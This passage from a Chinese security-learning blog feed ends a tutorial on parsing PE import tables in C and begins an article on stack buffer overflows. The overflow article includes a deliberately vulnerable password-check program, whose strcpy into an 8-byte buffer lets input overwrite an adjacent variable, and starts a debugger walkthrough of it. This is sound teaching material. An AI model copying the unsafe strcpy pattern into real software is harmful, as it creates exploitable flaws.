<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_THUNK_DATA32</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        DWORD ForwarderString<span class="token punctuation">;</span>      <span class="token comment">// PBYTE </span></pre></td></tr><tr><td data-num="4"></td><td><pre>        DWORD Function<span class="token punctuation">;</span>             <span class="token comment">// PDWORD</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        DWORD Ordinal<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        DWORD AddressOfData<span class="token punctuation">;</span>        <span class="token comment">// PIMAGE_IMPORT_BY_NAME</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#125;</span> u1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">typedef</span> IMAGE_THUNK_DATA32 <span class="token operator">*</span> PIMAGE_THUNK_DATA32<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226120128235.png" alt="image-20220226120128235" /></p>
<ul>
<li>_IMAGE_IMPORT_BY_NAME</li>
</ul>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_BY_NAME</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    WORD    Hint<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    CHAR   Name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_IMPORT_BY_NAME<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226120404893.png" alt="image-20220226120404893" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
<p>PE 编辑器查看导入表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123610696.png" alt="image-20220226123610696" /></p>
<h3 id="导入表解析函数代码"><a class="anchor" href="#导入表解析函数代码">#</a> 导入表解析函数代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123434816.png" alt="image-20220226123434816" /></p>
<h3 id="导入表动态信息库api解析代码"><a class="anchor" href="#导入表动态信息库api解析代码">#</a> 导入表动态信息库 (API) 解析代码</h3>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导入表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ImportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位导入表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pImportDir <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_IMPORT_DESCRIPTOR pImport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>		<span class="token keyword">char</span> <span class="token operator">*</span> szDllName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DLL名称：%s\n"</span><span class="token punctuation">,</span> szDllName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"日期时间标志：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>TimeDateStamp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ForwarderChain：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>ForwarderChain<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"FirstThunk：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>FirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OriginalFirstThunk：%08X\n\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 指向导入地址表的 RVA</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		PIMAGE_THUNK_DATA pIat <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_THUNK_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token comment">// 声明变量：导入表的偏移和补位</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		DWORD index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		DWORD ImportOffset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token comment">// 被导入函数的序号</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token keyword">while</span> <span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkRva：%08X\n"</span><span class="token punctuation">,</span> pImport<span class="token operator">-></span>OriginalFirstThunk <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>			ImportOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pImport<span class="token operator">-></span>OriginalFirstThunk<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkOffset：%08X\n"</span><span class="token punctuation">,</span> ImportOffset <span class="token operator">+</span> index<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>			index <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Ordinal <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>				PIMAGE_IMPORT_BY_NAME pName <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_IMPORT_BY_NAME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>AddressOfData<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"API名称：%s\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 名称</span></pre></td></tr><tr><td data-num="39"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hint(序号)：%04X\n"</span><span class="token punctuation">,</span> pName<span class="token operator">-></span>Hint<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 序号</span></pre></td></tr><tr><td data-num="40"></td><td><pre>				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ThunkValue：%08X\n\n"</span><span class="token punctuation">,</span> pIat<span class="token operator">-></span>u1<span class="token punctuation">.</span>Function<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 被导入函数的地址</span></pre></td></tr><tr><td data-num="41"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>			pIat <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		pImport <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="运行结果-3"><a class="anchor" href="#运行结果-3">#</a> 运行结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226142448246.png" alt="image-20220226142448246" /></p>
<h2 id="报错"><a class="anchor" href="#报错">#</a> 报错</h2>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ntdll.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="2"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>kernel32.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="3"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>KernelBase.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="4"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>vcruntime140d.dll”。无法查找或打开 PDB 文件。</pre></td></tr><tr><td data-num="5"></td><td><pre>“Project3.exe”<span class="token punctuation">(</span>Win32<span class="token punctuation">)</span>: 已加载“C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>SysWOW64<span class="token punctuation">\</span>ucrtbased.dll”。无法查找或打开 PDB 文件。</pre></td></tr></table></figure><h3 id="报错原因"><a class="anchor" href="#报错原因">#</a> 报错原因</h3>
<p>因为之前换行符 &quot;\&quot; 显示为 &quot;￥&quot;，所以更换了字体为 <code>仿宋体</code> 从而导致部分符号需重新挂载</p>
<h3 id="解决方法"><a class="anchor" href="#解决方法">#</a> 解决方法</h3>
<ol>
<li>点 <code>调试</code> ，然后  <code>选项</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122642938.png" alt="image-20220226122642938" /></p>
<ol start="2">
<li>右边勾上  <code>启用源服务器支持</code></li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122743439.png" alt="image-20220226122743439" /></p>
<ol start="3">
<li>左边点  <code>符号</code> ，把  <code>微软符号服务器</code>  勾选上</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122823133.png" alt="image-20220226122823133" /></p>
<ol start="4">
<li>运行的时候等一下，等待加载完成后就好了。</li>
</ol>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226122854825.png" alt="image-20220226122854825" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226123337123.png" alt="image-20220226123337123" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制漏洞栈溢出与代码植入解析</title>
    <url>/article/ed46cb90.html</url>
    <content><![CDATA[<h2 id="临近变量覆盖"><a class="anchor" href="#临近变量覆盖">#</a> 临近变量覆盖</h2>
<p>创建新项目后将源码放入，进行编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408152521152.png" alt="image-20220408152521152" /></p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PASSWORD</span> <span class="token string">"1234567"</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">int</span> <span class="token function">verify_password</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>password<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// add local buff</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	authenticated<span class="token operator">=</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span>PASSWORD<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//over flowed here!	</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">return</span> authenticated<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token keyword">int</span> valid_flag<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"please input password:       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		</pre></td></tr><tr><td data-num="24"></td><td><pre>		<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		</pre></td></tr><tr><td data-num="26"></td><td><pre>		valid_flag <span class="token operator">=</span> <span class="token function">verify_password</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		</pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>valid_flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"incorrect password!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratulation! You have passed the verification!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>输入一个密码，这个密码存在一个长度为 <code>1024</code>  的 <code>char类型</code> 的字符数组中，然后通过 <code>strcmp函数</code> 验证输入密码是否与预设的密码 ( <code>1234567</code> ) 一致， <code>buffer</code>  的长度为 <code>8</code> ，将它用来存放存放输入的密码，通过 <code>strcpy函数</code> 将输入的字符存放到 <code>buffer</code>  中用来触发栈溢出。</p>
<p><strong>正常测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408153343442.png" alt="image-20220408153343442" /></p>
<p><strong>溢出测试</strong></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408153432539.png" alt="image-20220408153432539" /></p>
<p>将测试程序用 OD 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408153912422.png" alt="image-20220408153912422" /></p>
<p>找到函数入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408154056537.png" alt="image-20220408154056537" /></p>
<p>进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408154128364.png" alt="image-20220408154128364" /></p>
<p>可以看到俩个跳转表，一个是主函数，一个是验证函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408154213307.png" alt="image-20220408154213307" /></p>
<p>f8 跳转到主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408154300729.png" alt="image-20220408154300729" /></p>
<p>函数分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408170351740.png" alt="image-20220408170351740" /></p>
<p>f7 进入 call，可以看到是另一个跳转表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408170521897.png" alt="image-20220408170521897" /></p>
<p>f8 跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408170545812.png" alt="image-20220408170545812" /></p>
<p>f8 调试可以看到 <code>strcmp</code>  的返回值存放在 <code>eax</code>  中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220408171130822.png" alt="image-20220408171130822" /></p>
<p>继续往下，然后在堆栈区跳转到 ebp 查看</p>
